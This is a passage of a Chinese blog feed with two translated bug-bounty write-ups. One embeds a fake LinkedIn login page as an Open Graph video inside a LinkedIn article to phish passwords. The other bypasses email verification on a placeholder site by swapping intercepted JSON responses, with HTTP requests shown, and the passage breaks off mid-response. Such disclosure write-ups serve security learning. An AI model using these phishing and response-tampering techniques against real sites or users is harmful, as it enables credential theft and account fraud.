href="#emsp-emsp-如果让我们寻找在哪里可以嵌入外部内容的地方的话，博客往往是最好的选择。点击下图-Write-an-Article-按钮编辑文章" class="headerlink" title="&emsp;&emsp;如果让我们寻找在哪里可以嵌入外部内容的地方的话，博客往往是最好的选择。点击下图 Write an Article 按钮编辑文章"></a>&emsp;&emsp;如果让我们寻找在哪里可以嵌入外部内容的地方的话，博客往往是最好的选择。点击下图 Write an Article 按钮编辑文章</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/4.png" alt=""></p>
<h4 id="emsp-emsp-我们得到一个漂亮又干净的编辑器，它允许我们编写文章，包括标题和内容。在我们的光标旁边有一个小图标，它允许我们”添加图像或者视频以获得视觉效果”。"><a href="#emsp-emsp-我们得到一个漂亮又干净的编辑器，它允许我们编写文章，包括标题和内容。在我们的光标旁边有一个小图标，它允许我们”添加图像或者视频以获得视觉效果”。" class="headerlink" title="&emsp;&emsp;我们得到一个漂亮又干净的编辑器，它允许我们编写文章，包括标题和内容。在我们的光标旁边有一个小图标，它允许我们”添加图像或者视频以获得视觉效果”。"></a>&emsp;&emsp;我们得到一个漂亮又干净的编辑器，它允许我们编写文章，包括标题和内容。在我们的光标旁边有一个小图标，它允许我们”添加图像或者视频以获得视觉效果”。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/5.png" alt=""></p>
<h4 id="emsp-emsp-如果我们按下这个小图标，我们就可以选择链接按钮，并在我们的博客中添加丰富视觉的内容"><a href="#emsp-emsp-如果我们按下这个小图标，我们就可以选择链接按钮，并在我们的博客中添加丰富视觉的内容" class="headerlink" title="&emsp;&emsp;如果我们按下这个小图标，我们就可以选择链接按钮，并在我们的博客中添加丰富视觉的内容"></a>&emsp;&emsp;如果我们按下这个小图标，我们就可以选择链接按钮，并在我们的博客中添加丰富视觉的内容</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/6.gif" alt=""></p>
<h4 id="嵌入请求："><a href="#嵌入请求：" class="headerlink" title="嵌入请求："></a>嵌入请求：</h4><h4 id="emsp-emsp-是时候启动Burp-Suite并检查我们的网络流量了，在我们填写URL之后会发生什么？"><a href="#emsp-emsp-是时候启动Burp-Suite并检查我们的网络流量了，在我们填写URL之后会发生什么？" class="headerlink" title="&emsp;&emsp;是时候启动Burp Suite并检查我们的网络流量了，在我们填写URL之后会发生什么？"></a>&emsp;&emsp;是时候启动Burp Suite并检查我们的网络流量了，在我们填写URL之后会发生什么？</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/7.png" alt=""></p>
<p>[*]链接被转换为嵌入Youtube播放器的HTML代码</p>
<h4 id="emsp-emsp-可以看到LinkedIn将我们输入的URL转换为我们可以嵌入的HTML代码。响应是将URL编码之后的内容，解码之后如下所示："><a href="#emsp-emsp-可以看到LinkedIn将我们输入的URL转换为我们可以嵌入的HTML代码。响应是将URL编码之后的内容，解码之后如下所示：" class="headerlink" title="&emsp;&emsp;可以看到LinkedIn将我们输入的URL转换为我们可以嵌入的HTML代码。响应是将URL编码之后的内容，解码之后如下所示："></a>&emsp;&emsp;可以看到LinkedIn将我们输入的URL转换为我们可以嵌入的HTML代码。响应是将<a href="https://meyerweb.com/eric/tools/dencoder/" target="_blank" rel="external">URL编码</a>之后的内容，解码之后如下所示：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;“embedIframe”:”&lt;iframe src=\”https://www.linkedin.com/pulse/api/edit/embed?embed=&#123;&quot;request&quot;:&#123;&quot;originalUrl&quot;:&quot;https://www.youtube.com/watch?v=9hWgA7qjK2c&quot;,&quot;finalUrl&quot;:&quot;https://www.youtube.com/watch?v=9hWgA7qjK2c&quot;&#125;,&quot;images&quot;:[&#123;&quot;width&quot;:480,&quot;url&quot;:&quot;https://i.ytimg.com/vi/9hWgA7qjK2c/hqdefault.jpg&quot;,&quot;height&quot;:360&#125;,&#123;&quot;width&quot;:1920,&quot;url&quot;:&quot;https://i.ytimg.com/vi/9hWgA7qjK2c/maxresdefault.jpg&quot;,&quot;height&quot;:1080&#125;],&quot;data&quot;:&#123;&quot;com.linkedin.treasury.Video&quot;:&#123;&quot;width&quot;:480,&quot;html&quot;:&quot;&lt;iframe scrolling=\”no\” allowfullscreen src=\”//media.licdn.com/embeds/media.html?src=https://www.youtube.com/embed/9hWgA7qjK2c?feature=oembed&amp;amp;url=https://www.youtube.com/watch?v=9hWgA7qjK2c&amp;amp;type=text/html&amp;amp;schema=youtube\&quot; width=\”480\” frameborder=\”0\” class=\”embedly-embed\” height=\”270\” /&gt;”,”height”:270&#125;&#125;,”provider”:&#123;“display”:”YouTube”,”name”:”YouTube”,”url”:”https://www.youtube.com/&quot;&#125;,&quot;author&quot;:&#123;&quot;name&quot;:&quot;321 Relaxing — Meditation Relax Clips”&#125;,”description”:&#123;“localized”:&#123;“en_US”:”Rain HD video and forest, relaxing rain sounds and forest sounds for sleeping meditation. Nature sounds relaxation. Rainforest sounds: https://www.youtube.co...&quot;&#125;&#125;,&quot;title&quot;:&#123;&quot;localized&quot;:&#123;&quot;en_US&quot;:&quot;Rain Sounds and Forest Sounds — Relaxing Sleep”&#125;&#125;,”type”:”video”&#125;&amp;signature=AcdfNDjBXZOjo2vdz4EOixtGBrlx\”&gt;&lt;/iframe&gt;”,”universal”:true&#125;</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-编辑器将这个iframe解析到我们的文章中，这导致视频播放器出现之前会有三个iframe互相嵌套。"><a href="#emsp-emsp-编辑器将这个iframe解析到我们的文章中，这导致视频播放器出现之前会有三个iframe互相嵌套。" class="headerlink" title="&emsp;&emsp;编辑器将这个iframe解析到我们的文章中，这导致视频播放器出现之前会有三个iframe互相嵌套。"></a>&emsp;&emsp;编辑器将这个iframe解析到我们的文章中，这导致视频播放器出现之前会有三个iframe互相嵌套。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/8.png" alt=""></p>
<h4 id="emsp-emsp-这意味着即使我们能够注入我们自己的恶意HTML代码，我们也无法访问LinkedIn域名；我们在iframe中被隔离了。我们无法访问任何LinkedIn-cookies，并且我们无法操纵iframe之外的HTML。"><a href="#emsp-emsp-这意味着即使我们能够注入我们自己的恶意HTML代码，我们也无法访问LinkedIn域名；我们在iframe中被隔离了。我们无法访问任何LinkedIn-cookies，并且我们无法操纵iframe之外的HTML。" class="headerlink" title="&emsp;&emsp;这意味着即使我们能够注入我们自己的恶意HTML代码，我们也无法访问LinkedIn域名；我们在iframe中被隔离了。我们无法访问任何LinkedIn cookies，并且我们无法操纵iframe之外的HTML。"></a>&emsp;&emsp;这意味着即使我们能够注入我们自己的恶意HTML代码，我们也无法访问LinkedIn域名；我们在iframe中被隔离了。我们无法访问任何LinkedIn cookies，并且我们无法操纵iframe之外的HTML。</h4><h4 id="emsp-emsp-但是我们可以注入一个虚假的LinkedIn登录屏幕并窃取访问者的密码，这种可能性还是挺大的。LinkedIn嵌入内容时没有任何视觉上的提示，被嵌入的内容只是干净的无边框，因此访问者很难将其与真正的登录屏幕区分开来。"><a href="#emsp-emsp-但是我们可以注入一个虚假的LinkedIn登录屏幕并窃取访问者的密码，这种可能性还是挺大的。LinkedIn嵌入内容时没有任何视觉上的提示，被嵌入的内容只是干净的无边框，因此访问者很难将其与真正的登录屏幕区分开来。" class="headerlink" title="&emsp;&emsp;但是我们可以注入一个虚假的LinkedIn登录屏幕并窃取访问者的密码，这种可能性还是挺大的。LinkedIn嵌入内容时没有任何视觉上的提示，被嵌入的内容只是干净的无边框，因此访问者很难将其与真正的登录屏幕区分开来。"></a>&emsp;&emsp;但是我们可以注入一个虚假的LinkedIn登录屏幕并窃取访问者的密码，这种可能性还是挺大的。LinkedIn嵌入内容时没有任何视觉上的提示，被嵌入的内容只是干净的无边框，因此访问者很难将其与真正的登录屏幕区分开来。</h4><h4 id="一个完美的网络钓鱼登录"><a href="#一个完美的网络钓鱼登录" class="headerlink" title="一个完美的网络钓鱼登录:"></a>一个完美的网络钓鱼登录:</h4><h4 id="emsp-emsp-首先我们需要设计钓鱼登录屏幕，因为我们希望让非技术人员也能够理解到它的严重性。一个简单的javascript警告框通常不够说服力。"><a href="#emsp-emsp-首先我们需要设计钓鱼登录屏幕，因为我们希望让非技术人员也能够理解到它的严重性。一个简单的javascript警告框通常不够说服力。" class="headerlink" title="&emsp;&emsp;首先我们需要设计钓鱼登录屏幕，因为我们希望让非技术人员也能够理解到它的严重性。一个简单的javascript警告框通常不够说服力。"></a>&emsp;&emsp;首先我们需要设计钓鱼登录屏幕，因为我们希望让非技术人员也能够理解到它的严重性。一个简单的javascript警告框通常不够说服力。</h4><h4 id="emsp-emsp-SnappySnippet是一个复制其它网站HTML元素的工具。该Chrome扩展程序允许您选择网站中的元素，并将其粘贴为纯HTML和CSS代码"><a href="#emsp-emsp-SnappySnippet是一个复制其它网站HTML元素的工具。该Chrome扩展程序允许您选择网站中的元素，并将其粘贴为纯HTML和CSS代码" class="headerlink" title="&emsp;&emsp;SnappySnippet是一个复制其它网站HTML元素的工具。该Chrome扩展程序允许您选择网站中的元素，并将其粘贴为纯HTML和CSS代码"></a>&emsp;&emsp;SnappySnippet是一个复制其它网站HTML元素的工具。该Chrome扩展程序允许您选择网站中的元素，并将其粘贴为纯HTML和CSS代码</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/9.png" alt=""></p>
<h4 id="emsp-emsp-我们将来自SnappySnippet的代码粘贴到一个新的HTML文件中，稍微调整一下，然后在最后添加一些javascript，以便捕获email和密码。如果有人提交表单，我们希望在javascript弹窗中显示登录详情作为概念证明"><a href="#emsp-emsp-我们将来自SnappySnippet的代码粘贴到一个新的HTML文件中，稍微调整一下，然后在最后添加一些javascript，以便捕获email和密码。如果有人提交表单，我们希望在javascript弹窗中显示登录详情作为概念证明" class="headerlink" title="&emsp;&emsp;我们将来自SnappySnippet的代码粘贴到一个新的HTML文件中，稍微调整一下，然后在最后添加一些javascript，以便捕获email和密码。如果有人提交表单，我们希望在javascript弹窗中显示登录详情作为概念证明"></a>&emsp;&emsp;我们将来自SnappySnippet的代码粘贴到一个新的HTML文件中，稍微调整一下，然后在最后添加一些javascript，以便捕获email和密码。如果有人提交表单，我们希望在javascript弹窗中显示登录详情作为概念证明</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/10.png" alt=""></p>
<h4 id="emsp-emsp-让我们将这个虚假的登录html文件上传到我们自己的服务器上，并尝试将其嵌入我们的LinkedIn文章中。看看如果我们在没有任何oEmbed或者Open-Graph标签的情况下链接会发生什么。"><a href="#emsp-emsp-让我们将这个虚假的登录html文件上传到我们自己的服务器上，并尝试将其嵌入我们的LinkedIn文章中。看看如果我们在没有任何oEmbed或者Open-Graph标签的情况下链接会发生什么。" class="headerlink" title="&emsp;&emsp;让我们将这个虚假的登录html文件上传到我们自己的服务器上，并尝试将其嵌入我们的LinkedIn文章中。看看如果我们在没有任何oEmbed或者Open Graph标签的情况下链接会发生什么。"></a>&emsp;&emsp;让我们将这个虚假的登录html文件上传到我们自己的服务器上，并尝试将其嵌入我们的LinkedIn文章中。看看如果我们在没有任何oEmbed或者Open Graph标签的情况下链接会发生什么。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/11.png" alt=""></p>
<h4 id="emsp-emsp-我们可以看到它被放到了一个”通用嵌入式包装器”中，只是显示了我们的URL，周围有一个小的灰色边框而已。"><a href="#emsp-emsp-我们可以看到它被放到了一个”通用嵌入式包装器”中，只是显示了我们的URL，周围有一个小的灰色边框而已。" class="headerlink" title="&emsp;&emsp;我们可以看到它被放到了一个”通用嵌入式包装器”中，只是显示了我们的URL，周围有一个小的灰色边框而已。"></a>&emsp;&emsp;我们可以看到它被放到了一个”通用嵌入式包装器”中，只是显示了我们的URL，周围有一个小的灰色边框而已。</h4><h4 id="利用Open-Graph："><a href="#利用Open-Graph：" class="headerlink" title="利用Open Graph："></a>利用Open Graph：</h4><h4 id="emsp-emsp-如果我们仔细查看Open-Graph-协议规范，我们会发现有一个名为og-video的标签。它定义了如何嵌入视频播放器。"><a href="#emsp-emsp-如果我们仔细查看Open-Graph-协议规范，我们会发现有一个名为og-video的标签。它定义了如何嵌入视频播放器。" class="headerlink" title="&emsp;&emsp;如果我们仔细查看Open Graph 协议规范，我们会发现有一个名为og:video的标签。它定义了如何嵌入视频播放器。"></a>&emsp;&emsp;如果我们仔细查看Open Graph 协议规范，我们会发现有一个名为og:video的标签。它定义了如何嵌入视频播放器。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/12.png" alt=""></p>
<h4 id="emsp-emsp-现在我们创建一个带有og-video标签的HTML文件，然后在其中加载我们构造的虚假登录链接而不是视频播放器，结果会怎样呢？"><a href="#emsp-emsp-现在我们创建一个带有og-video标签的HTML文件，然后在其中加载我们构造的虚假登录链接而不是视频播放器，结果会怎样呢？" class="headerlink" title="&emsp;&emsp;现在我们创建一个带有og:video标签的HTML文件，然后在其中加载我们构造的虚假登录链接而不是视频播放器，结果会怎样呢？"></a>&emsp;&emsp;现在我们创建一个带有og:video标签的HTML文件，然后在其中加载我们构造的虚假登录链接而不是视频播放器，结果会怎样呢？</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/13.png" alt=""></p>
<p>[*]我们试图将该文档作为视频播放器嵌入到文章中</p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/14.png" alt=""></p>
<p>[*]我们的虚假登录被加载，LinkedIn认为它是一个真正的视频播放器</p>
<h4 id="emsp-emsp-我们成功在LinkedIn中嵌入了我们的虚假登陆页面。我们将文章命名为’Oops-something-went-wrong-’"><a href="#emsp-emsp-我们成功在LinkedIn中嵌入了我们的虚假登陆页面。我们将文章命名为’Oops-something-went-wrong-’" class="headerlink" title="&emsp;&emsp;我们成功在LinkedIn中嵌入了我们的虚假登陆页面。我们将文章命名为’Oops,something went wrong!’"></a>&emsp;&emsp;我们成功在LinkedIn中嵌入了我们的虚假登陆页面。我们将文章命名为’Oops,something went wrong!’</h4><h4 id="emsp-emsp-我们现在可以通过给其他用户分享该文章的私有链接来进行钓鱼。或者也可以直接在LinkedIn上发表它，看看会发生什么。"><a href="#emsp-emsp-我们现在可以通过给其他用户分享该文章的私有链接来进行钓鱼。或者也可以直接在LinkedIn上发表它，看看会发生什么。" class="headerlink" title="&emsp;&emsp;我们现在可以通过给其他用户分享该文章的私有链接来进行钓鱼。或者也可以直接在LinkedIn上发表它，看看会发生什么。"></a>&emsp;&emsp;我们现在可以通过给其他用户分享该文章的私有链接来进行钓鱼。或者也可以直接在LinkedIn上发表它，看看会发生什么。</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_20/16.gif" alt=""></p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><h4 id="emsp-emsp-我们找到了一种在LinkedLn-com域上创建钓鱼网页的方法。我们使用Open-Graph-Video-meta标签以便在LinkedLn文章中将我们的网络钓鱼页面作为视频播放器注入。"><a href="#emsp-emsp-我们找到了一种在LinkedLn-com域上创建钓鱼网页的方法。我们使用Open-Graph-Video-meta标签以便在LinkedLn文章中将我们的网络钓鱼页面作为视频播放器注入。" class="headerlink" title="&emsp;&emsp;我们找到了一种在LinkedLn.com域上创建钓鱼网页的方法。我们使用Open Graph Video meta标签以便在LinkedLn文章中将我们的网络钓鱼页面作为视频播放器注入。"></a>&emsp;&emsp;我们找到了一种在LinkedLn.com域上创建钓鱼网页的方法。我们使用Open Graph Video meta标签以便在LinkedLn文章中将我们的网络钓鱼页面作为视频播放器注入。</h4><h4 id="emsp-emsp-这是持久性XSS攻击的变体。"><a href="#emsp-emsp-这是持久性XSS攻击的变体。" class="headerlink" title="&emsp;&emsp;这是持久性XSS攻击的变体。"></a>&emsp;&emsp;这是持久性XSS攻击的变体。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第十九篇：绕过邮件验证]]></title>
      <url>/2019/02/18/%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AF%87%EF%BC%9A%E7%BB%95%E8%BF%87%E9%82%AE%E4%BB%B6%E9%AA%8C%E8%AF%81/</url>
      <content type="html"><![CDATA[<h4 id="原文：A-Curious-Case-From-Little-To-Complete-Email-Verification-Bypass"><a href="#原文：A-Curious-Case-From-Little-To-Complete-Email-Verification-Bypass" class="headerlink" title="原文：A Curious Case From Little To Complete Email Verification Bypass"></a>原文：<a href="https://medium.com/bugbountywriteup/a-curious-case-from-little-to-complete-email-verification-bypass-2c7570040e7e" target="_blank" rel="external">A Curious Case From Little To Complete Email Verification Bypass</a></h4><h4 id="漏洞：篡改response响应信息绕过验证机制"><a href="#漏洞：篡改response响应信息绕过验证机制" class="headerlink" title="漏洞：篡改response响应信息绕过验证机制"></a>漏洞：篡改response响应信息绕过验证机制</h4><h4 id="作者：N0-M3ga-Hacks"><a href="#作者：N0-M3ga-Hacks" class="headerlink" title="作者：N0_M3ga_Hacks"></a>作者：<a href="https://medium.com/@N0_M3ga_Hacks" target="_blank" rel="external">N0_M3ga_Hacks</a></h4><h4 id="难度：中"><a href="#难度：中" class="headerlink" title="难度：中"></a>难度：中</h4><a id="more"></a>
<h4 id="实施电子邮件验证机制是很容易出错的，验证中的轻微错误就可能导致严重的安全问题或漏洞，下面我将介绍一个相关的案例。"><a href="#实施电子邮件验证机制是很容易出错的，验证中的轻微错误就可能导致严重的安全问题或漏洞，下面我将介绍一个相关的案例。" class="headerlink" title="实施电子邮件验证机制是很容易出错的，验证中的轻微错误就可能导致严重的安全问题或漏洞，下面我将介绍一个相关的案例。"></a>实施电子邮件验证机制是很容易出错的，验证中的轻微错误就可能导致严重的安全问题或漏洞，下面我将介绍一个相关的案例。</h4><p>####当我们输入完所需的信息（姓名、电子邮件）之后，通常服务器将发送验证邮件到邮箱当中，其中验证邮件的结构如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://yolosite.com/#/register/confirm/6135fbbf3e52effa1a04c6fcf7e1dd426f2cdf36803f413481b62e2803b52dad</div></pre></td></tr></table></figure>
<h4 id="访问该链接将更多的信息，例如信用卡信息等。更改token的值将导致链接无效，正常访问之后的响应如下："><a href="#访问该链接将更多的信息，例如信用卡信息等。更改token的值将导致链接无效，正常访问之后的响应如下：" class="headerlink" title="访问该链接将更多的信息，例如信用卡信息等。更改token的值将导致链接无效，正常访问之后的响应如下："></a>访问该链接将更多的信息，例如信用卡信息等。更改token的值将导致链接无效，正常访问之后的响应如下：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Content-Type: application/json</div><div class="line">Access-Control-Allow-Origin: *</div><div class="line">Access-Control-Allow-Credentials: true</div><div class="line">Access-Control-Max-Age: 1000</div><div class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT</div><div class="line">Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With, </div><div class="line"></div><div class="line">&#123;&quot;response&quot;:</div><div class="line">&#123;&quot;status&quot;:&quot;success&quot;,&quot;externalID&quot;:null,&quot;errors&quot;:[]&#125;&#125;</div></pre></td></tr></table></figure>
<h4 id="但是如果token被篡改之后（更改了第一个和最后一个值），响应如下："><a href="#但是如果token被篡改之后（更改了第一个和最后一个值），响应如下：" class="headerlink" title="但是如果token被篡改之后（更改了第一个和最后一个值），响应如下："></a>但是如果token被篡改之后（更改了第一个和最后一个值），响应如下：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Content-Type: application/json</div><div class="line">Access-Control-Allow-Origin: *</div><div class="line">Access-Control-Allow-Credentials: true</div><div class="line">Access-Control-Max-Age: 1000</div><div class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT</div><div class="line">Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With, </div><div class="line">&#123;&quot;response&quot;:&#123;&quot;status&quot;:&quot;failure&quot;,&quot;externalID&quot;:&quot;7135fbbf3e52effa1a04c6fcf7e1dd426f2cdf36803f413481b62e2803b52dae&quot;,&quot;errors&quot;:[&#123;&quot;code&quot;:&quot;1210&quot;,&quot;message&quot;:&quot;Confirmation link is invalid&quot;&#125;]&#125;,&quot;userStatus&quot;:null&#125;</div></pre></td></tr></table></figure>
<h4 id="最初我认为这可能是因为tokent只有一部分正确造成的结果，所以我决定用一个完全随机的token，下面是我伪造的链接和响应："><a href="#最初我认为这可能是因为tokent只有一部分正确造成的结果，所以我决定用一个完全随机的token，下面是我伪造的链接和响应：" class="headerlink" title="最初我认为这可能是因为tokent只有一部分正确造成的结果，所以我决定用一个完全随机的token，下面是我伪造的链接和响应："></a>最初我认为这可能是因为tokent只有一部分正确造成的结果，所以我决定用一个完全随机的token，下面是我伪造的链接和响应：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://yolosite.com/#/register/confirm/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</div></pre></td></tr></table></figure>
<p>[*]下面的事响应信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Content-Type: application/json</div><div class="line">Access-Control-Allow-Origin: *</div><div class="line">Access-Control-Allow-Credentials: true</div><div class="line">Access-Control-Max-Age: 1000</div><div class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT</div><div class="line">Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With</div><div class="line">Connection: close</div><div class="line">Set-Cookie: Cookies here;</div><div class="line"></div><div class="line">&#123;&quot;response&quot;:&#123;&quot;status&quot;:&quot;failure&quot;,&quot;externalID&quot;:&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;,&quot;errors&quot;:[&#123;&quot;code&quot;:&quot;1211&quot;,&quot;message&quot;:&quot;User not associated with this external id&quot;&#125;]&#125;,&quot;userStatus&quot;:null&#125;</div></pre></td></tr></table></figure>
<h4 id="我再次尝试伪造链接，但是这次我决定拦截响应信息，并且使用上面成功的JSON替换响应信息"><a href="#我再次尝试伪造链接，但是这次我决定拦截响应信息，并且使用上面成功的JSON替换响应信息" class="headerlink" title="我再次尝试伪造链接，但是这次我决定拦截响应信息，并且使用上面成功的JSON替换响应信息"></a>我再次尝试伪造链接，但是这次我决定拦截响应信息，并且使用上面成功的JSON替换响应信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;&quot;response&quot;:&#123;&quot;status&quot;:&quot;success&quot;,&quot;externalID&quot;:null,&quot;errors&quot;:[]&#125;&#125;</div></pre></td></tr></table></figure>
<h4 id="我被要求输入信用卡信息，这不是唯一需要被绕过的点。事实证明，防御机制仅基于JSON响应，并别没有进行服务端验证。但是再进一步尝试输入信用卡信息并点击完成注册后，我们会发送如下请求，并且得到响应："><a href="#我被要求输入信用卡信息，这不是唯一需要被绕过的点。事实证明，防御机制仅基于JSON响应，并别没有进行服务端验证。但是再进一步尝试输入信用卡信息并点击完成注册后，我们会发送如下请求，并且得到响应：" class="headerlink" title="我被要求输入信用卡信息，这不是唯一需要被绕过的点。事实证明，防御机制仅基于JSON响应，并别没有进行服务端验证。但是再进一步尝试输入信用卡信息并点击完成注册后，我们会发送如下请求，并且得到响应："></a>我被要求输入信用卡信息，这不是唯一需要被绕过的点。事实证明，防御机制仅基于JSON响应，并别没有进行服务端验证。但是再进一步尝试输入信用卡信息并点击完成注册后，我们会发送如下请求，并且得到响应：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">POST /rest/services/public/register/full HTTP/1.1</div><div class="line">Host: yolosite.com</div><div class="line">Connection: close</div><div class="line"></div><div class="line">&#123;&quot;externalId&quot;:&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;,&quot;locale&quot;:&quot;en_IT&quot;,&quot;fullRegFields&quot;:&#123;&quot;card-alias-name-0&quot;:&quot;Card-Name&quot;,&quot;card-numbers-0&quot;:&quot;card-number&quot;,&quot;expiry-month-0&quot;:&quot;MONTH&quot;,&quot;expiry-year-0&quot;:&quot;2019&quot;,&quot;cvc-0&quot;:&quot;cvc&quot;&#125;&#125;</div></pre></td></tr></table></figure>
<p>[*]下面的事响应信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 400 Bad Request</div><div class="line">Content-Type: application/json</div><div class="line">Access-Control-Allow-Origin: *</div><div class="line">Access-Control-Allow-Credentials: true</div><div class="line">Access-Control-Max-Age: 1000</div><div class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT</div><div class="line">Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With</div><div class="line">Connection: close</div><div class="line">Set-Cookie: Cookies here;</div><div class="line">&#123;&quot;status&quot;:&quot;error&quot;,&quot;externalID&quot;:&quot;&quot;,&quot;errors&quot;:[&#123;&quot;code&quot;:&quot;0000&quot;,&quot;message&quot;:&quot;An internal server error occurred&quot;&#125;]&#125;</div></pre></td></tr></table></figure>
<h4 id="似乎此时服务端才会真正校验token。尽管如此，我还是决定再次伪造响应，正常请求的响应信息如下"><a href="#似乎此时服务端才会真正校验token。尽管如此，我还是决定再次伪造响应，正常请求的响应信息如下" class="headerlink" title="似乎此时服务端才会真正校验token。尽管如此，我还是决定再次伪造响应，正常请求的响应信息如下"></a>似乎此时服务端才会真正校验token。尽管如此，我还是决定再次伪造响应，正常请求的响应信息如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Content-Type: application/json</div><div class="line">Access-Control-Allow-Origin: *</div><div class="line">Access-Control-Allow-Credentials: true</div><div class="line">Access-Control-Max-Age: 1000</div><div class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT</div><div class="line">Access-Control-Allow-Headers: Cache-Control, If-Modified-Since, X-Requested-With</div><div class="line">Connection: close</div><div class="line">Set-Cookie: Cookies here;</div><div class="line">&#123;&quot;response&quot;:&#123;&quot;status&quot;:&quot;success&quot;,&quot;externalID&quot;:null,&quot;errors&quot;:[]&#125;&#125;</div></pre></td></tr></table></figure>
<h4 id="一旦上述请求被转发，我就会被传送到登录页面。但是最终并没有像我期望的那样会登录上去，我决定再做进一步调查"><a href="#一旦上述请求被转发，我就会被传送到登录页面。但是最终并没有像我期望的那样会登录上去，我决定再做进一步调查" class="headerlink" title="一旦上述请求被转发，我就会被传送到登录页面。但是最终并没有像我期望的那样会登录上去，我决定再做进一步调查"></a>一旦上述请求被转发，我就会被传送到登录页面。但是最终并没有像我期望的那样会登录上去，我决定再做进一步调查</h4><h4 id="当验证后的用户尝试登录时，下面是请求信息"><a href="#当验证后的用户尝试登录时，下面是请求信息" class="headerlink" title="当验证后的用户尝试登录时，下面是请求信息"></a>当验证后的用户尝试登录时，下面是请求信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">POST /pkmslogin.form HTTP/1.1</div><div class="line">Host: yolosite.com</div><div class="line">Connection: close</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line"></div><div class="line">username=username-here&amp;password=Password-here&amp;login-form-type=pwd</div></pre></td></tr></table></figure>
<p>[*]下面的事响应信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302 Moved Temporarily</div><div class="line">Content-Length: 1770</div><div class="line">Content-Type: text/html</div><div class="line">Location: 